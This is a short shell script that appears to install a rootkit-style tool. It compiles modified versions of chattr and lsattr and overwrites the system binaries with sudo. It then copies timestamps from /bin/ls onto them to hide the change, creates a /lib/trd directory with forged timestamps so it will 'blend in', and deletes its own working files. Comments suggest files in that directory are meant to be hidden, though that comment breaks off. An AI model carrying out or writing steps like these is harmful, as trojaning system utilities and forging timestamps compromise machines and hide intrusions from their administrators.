gcc chattr.c pf.c iod.c fgetflags.c fsetflags.c -o chattr
gcc lsattr.c pf.c iod.c fgetflags.c -o lsattr

#Overwrite the old chattr. If the user wants a backup, that's their problem.
sudo cp ./chattr $(which chattr)
sudo cp ./lsattr $(which lsattr)
#Copy date modified and such
sudo touch -r /bin/ls $(which chattr)
sudo touch -r /bin/ls $(which lsattr)

#Make the directory and make it blend in.
#If the file /lib/trd/.(filename) exists, 
sudo mkdir /lib/trd
sudo touch -r /lib/lsb /lib/trd

rm *